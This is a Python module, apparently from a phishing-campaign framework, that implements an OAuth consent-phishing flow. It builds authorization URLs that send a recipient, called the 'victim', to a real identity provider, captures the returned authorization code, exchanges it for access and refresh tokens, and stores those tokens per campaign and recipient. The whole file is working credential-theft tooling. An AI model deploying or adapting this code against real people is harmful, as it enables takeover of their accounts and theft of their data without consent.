"""OAuth2 phishing flow helpers.

Campaigns can configure a fake OAuth consent flow that redirects the victim to
a real identity provider, then captures the authorization code (and optionally
exchanges it for tokens) on the callback.
"""

import base64
import json
import logging
import secrets
import urllib.parse
from typing import Any

import requests

from dropoutjeep_lib import db
from dropoutjeep_lib.models import Campaign, Recipient, OAuthTokenCapture, CapturedOAuthToken, Event

logger = logging.getLogger(__name__)


def _build_state(campaign_id: int, recipient_token: str) -> str:
    payload = f"{campaign_id}:{recipient_token}"
    return base64.urlsafe_b64encode(payload.encode()).decode().rstrip("=")


def _parse_state(state: str) -> tuple[int | None, str | None]:
    try:
        padded = state + "=" * (-len(state) % 4)
        payload = base64.urlsafe_b64decode(padded).decode()
        campaign_id, recipient_token = payload.split(":", 1)
        return int(campaign_id), recipient_token
    except Exception:
        return None, None


def build_authorization_url(
    campaign_id: int,
    recipient_token: str,
    authorization_endpoint: str,
    client_id: str,
    redirect_uri: str,
    scope: str,
    extra_params: dict | None = None,
) -> str:
    """Return the URL that sends the victim to the real OAuth provider."""
    params = {
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "scope": scope,
        "state": _build_state(campaign_id, recipient_token),
    }
    if extra_params:
        params.update(extra_params)
    sep = "&" if "?" in authorization_endpoint else "?"
    return authorization_endpoint + sep + urllib.parse.urlencode(params)


def capture_auth_code(
    campaign_id: int,
    recipient_token: str,
    provider: str,
    auth_code: str,
    scope: str | None = None,
) -> OAuthTokenCapture:
    """Persist a captured OAuth authorization code."""
    recipient = Recipient.query.filter_by(token=recipient_token, campaign_id=campaign_id).first()
    capture = OAuthTokenCapture(
        campaign_id=campaign_id,
        recipient_id=recipient.id if recipient else None,
        recipient_token=recipient_token,
        provider=provider,
        auth_code=auth_code,
        scope=scope,
    )
    db.session.add(capture)
    db.session.add(Event(
        campaign_id=campaign_id,
        recipient_id=recipient.id if recipient else None,
        event_type='oauth_auth_code_capture',
        meta=json.dumps({
            'provider': provider,
            'recipient_token': recipient_token,
        }, default=str),
    ))
    db.session.commit()
    return capture


def store_oauth_tokens(
    campaign_id: int,
    recipient_token: str,
    provider: str,
    token_response: dict[str, Any],
) -> CapturedOAuthToken | None:
    """Persist parsed OAuth tokens from a provider token response.

    Creates a CapturedOAuthToken row linked to the campaign/recipient.
    """
    recipient = Recipient.query.filter_by(token=recipient_token, campaign_id=campaign_id).first()
    capture = CapturedOAuthToken(
        campaign_id=campaign_id,
        recipient_id=recipient.id if recipient else None,
        recipient_token=recipient_token,
        provider=provider,
        access_token=token_response.get("access_token"),
        refresh_token=token_response.get("refresh_token"),
        id_token=token_response.get("id_token"),
        token_type=token_response.get("token_type"),
        expires_in=token_response.get("expires_in"),
        scope=token_response.get("scope"),
    )
    db.session.add(capture)
    db.session.add(Event(
        campaign_id=campaign_id,
        recipient_id=recipient.id if recipient else None,
        event_type='oauth_token_capture',
        meta=json.dumps({
            'provider': provider,
            'recipient_token': recipient_token,
        }, default=str),
    ))
    db.session.commit()
    return capture


def exchange_code_for_tokens(
    capture: OAuthTokenCapture,
    token_endpoint: str,
    client_id: str,
    client_secret: str,
    redirect_uri: str,
) -> bool:
    """Exchange a captured authorization code for access/refresh tokens."""
    if not capture.auth_code:
        return False

    try:
        resp = requests.post(
            token_endpoint,
            data={
                "grant_type": "authorization_code",
                "code": capture.auth_code,
                "client_id": client_id,
                "client_secret": client_secret,
                "redirect_uri": redirect_uri,
            },
            timeout=30,
        )
        resp.raise_for_status()
        data = resp.json()
        capture.access_token = data.get("access_token")
        capture.refresh_token = data.get("refresh_token")
        capture.id_token = data.get("id_token")
        capture.token_type = data.get("token_type")
        capture.expires_in = data.get("expires_in")
        db.session.commit()

        # Also store a parsed copy in the dedicated token table.
        store_oauth_tokens(
            campaign_id=capture.campaign_id,
            recipient_token=capture.recipient_token or '',
            provider=capture.provider or 'unknown',
            token_response=data,
        )
        return True
    except Exception as exc:
        logger.exception("OAuth token exchange failed: %s", exc)
        return False
